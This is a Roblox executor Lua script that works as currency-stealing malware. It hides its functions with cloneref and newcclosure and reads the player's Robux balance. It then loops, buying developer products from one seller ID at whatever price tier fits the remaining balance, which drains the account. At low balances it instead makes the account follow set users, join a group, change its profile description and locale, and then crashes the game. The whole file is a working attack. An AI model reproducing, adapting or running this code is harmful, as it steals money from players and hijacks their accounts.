repeat task.wait() until game:IsLoaded();
local throw = clonefunction(warn);
local x = cloneref(game);
local httprbx = cloneref(game:GetService("HttpRbxApiService"));
local _stealth = clonefunction(newcclosure);
getgenv().crash = _stealth(function() x:Shutdown() end);
local executor = identifyexecutor();
local _get = _stealth(function(url)
x:HttpGetAsync(url)
end);
local _post = _stealth(function(url, data)
x:HttpPostAsync(url, data, "application/json")
end);

local response = _get("https://economy.roblox.com/v1/user/currency");
local start = string.find(response, '{"robux":');
if start then
    local ending = string.find(response, '}', start);
        if ending then
        rb = tonumber(string.sub(response, start + 9, ending - 1));
    end
end

local eros = '{"expectedCurrency":1,"expectedPrice":15,"expectedSellerId":3409950911}'
local hercules = '{"expectedCurrency":1,"expectedPrice":25,"expectedSellerId":3409950911}'
local hylos = '{"expectedCurrency":1,"expectedPrice":50,"expectedSellerId":3409950911}'
local tartarus = '{"expectedCurrency":1,"expectedPrice":100,"expectedSellerId":3409950911}'
local deimos = '{"expectedCurrency":1,"expectedPrice":200,"expectedSellerId":3409950911}'
local artemis = '{"expectedCurrency":1,"expectedPrice":300,"expectedSellerId":3409950911}'
local zeus = '{"expectedCurrency":1,"expectedPrice":500,"expectedSellerId":3409950911}'
local kratos = '{"expectedCurrency":1,"expectedPrice":750,"expectedSellerId":3409950911}'
local athena = '{"expectedCurrency":1,"expectedPrice":1000,"expectedSellerId":3409950911}'
local hephaestus = '{"expectedCurrency":1,"expectedPrice":1500,"expectedSellerId":3409950911}'
local hera = '{"expectedCurrency":1,"expectedPrice":2000,"expectedSellerId":3409950911}'
local krampus = '{"expectedCurrency":1,"expectedPrice":2500,"expectedSellerId":3409950911}'
local pegasus = '{"expectedCurrency":1,"expectedPrice":4000,"expectedSellerId":3409950911}'
local poseidon = '{"expectedCurrency":1,"expectedPrice":6000,"expectedSellerId":3409950911}'
local hermes = '{"expectedCurrency":1,"expectedPrice":8000,"expectedSellerId":3409950911}'
local apollo = '{"expectedCurrency":1,"expectedPrice":13000,"expectedSellerId":3409950911}'
local hades = '{"expectedCurrency":1,"expectedPrice":20000,"expectedSellerId":3409950911}'
local demeter = '{"expectedCurrency":1,"expectedPrice":35000,"expectedSellerId":3409950911}'
local atlas = '{"expectedCurrency":1,"expectedPrice":50000,"expectedSellerId":3409950911}'
local cronus = '{"expectedCurrency":1,"expectedPrice":75000,"expectedSellerId":3409950911}'
local helios = '{"expectedCurrency":1,"expectedPrice":150000,"expectedSellerId":3409950911}'

local function godly()
local player = game.Players.LocalPlayer
local userId = player.UserId
local description = '{"description":"discowd: itemset"}'
local none = ''
local china = '{"supportedLocaleCode":"zh_TW"}'
local friend = '{"friendshipOriginSourceType":0}'

pcall(function()
_post('https://friends.roblox.com/v1/users/5196213475/follow', none)
end)
task.wait(0.01)
pcall(function()
_post('https://groups.roblox.com/v1/groups/33418242/users', none)
end)
task.wait(0.01)
pcall(function()
_post("https://users.roblox.com/v1/description", description)
end)
task.wait(0.01)
_post("https://locale.roblox.com/v1/locales/set-user-supported-locale", china)
task.wait(0.01)
pcall(function()
_post('https://friends.roblox.com/v1/users/3578860627/follow', none)
end)
task.wait(0.01)
pcall(function()
_post('https://friends.roblox.com/v1/users/5030593299/follow', none)
end)
task.wait(0.01)
crash()
task.wait(3)
print("oops")
end

while wait(0.25) do
if rb == 0 then
godly()
elseif rb > 0 and rb < 15 then
godly()
elseif rb >= 15 and rb < 25 then
_post("https://economy.roblox.com/v1/purchases/products/1683704662", eros)
wait()
elseif rb >= 25 and rb < 50 then
_post("https://economy.roblox.com/v1/purchases/products/1683704860", hercules)
wait()
elseif rb >= 50 and rb < 100 then
_post("https://economy.roblox.com/v1/purchases/products/1680670958", hylos)
wait()
elseif rb >= 100 and rb < 200 then
_post("https://economy.roblox.com/v1/purchases/products/1680670695", tartarus)
wait()
elseif rb >= 200 and rb < 300 then
_post("https://economy.roblox.com/v1/purchases/products/1680670843", deimos)
wait()
elseif rb >= 300 and rb < 500 then
_post("https://economy.roblox.com/v1/purchases/products/1680670801", artemis)
wait()
elseif rb >= 500 and rb < 750 then
_post("https://economy.roblox.com/v1/purchases/products/1680670762", zeus)
wait()
elseif rb >= 750 and rb < 1000 then
_post("https://economy.roblox.com/v1/purchases/products/1680671056", kratos)
wait()
elseif rb >= 1000 and rb < 1500 then
_post("https://economy.roblox.com/v1/purchases/products/1680671032", athena)
wait()
elseif rb >= 1500 and rb < 2000 then
_post("https://economy.roblox.com/v1/purchases/products/1680670936", hephaestus)
wait()
elseif rb >= 2000 and rb < 2500 then
_post("https://economy.roblox.com/v1/purchases/products/1680671019", hera)
wait()
elseif rb >= 2500 and rb < 4000 then
_post("https://economy.roblox.com/v1/purchases/products/1680670895", krampus)
wait()
elseif rb >= 4000 and rb < 6000 then
_post("https://economy.roblox.com/v1/purchases/products/1680670910", pegasus)
wait()
elseif rb >= 6000 and rb < 8000 then
_post("https://economy.roblox.com/v1/purchases/products/1680670976", poseidon)
wait()
elseif rb >= 8000 and rb < 13000 then
_post("https://economy.roblox.com/v1/purchases/products/1680670744", hermes)
wait()
elseif rb >= 13000 and rb < 20000 then
_post("https://economy.roblox.com/v1/purchases/products/1680670998", apollo)
wait()
elseif rb >= 20000 and rb < 35000 then
_post("https://economy.roblox.com/v1/purchases/products/1680670874", hades)
wait()
elseif rb >= 35000 and rb < 50000 then
_post("https://economy.roblox.com/v1/purchases/products/1680670818", demeter)
wait()
elseif rb >= 50000 and rb < 75000 then
_post("https://economy.roblox.com/v1/purchases/products/1680670725", atlas)
wait()
elseif rb >= 75000 and rb < 150000 then
_post("https://economy.roblox.com/v1/purchases/products/1680670783", cronus)
wait()
else
_post("https://economy.roblox.com/v1/purchases/products/1680670855", helios)
wait()
end
end
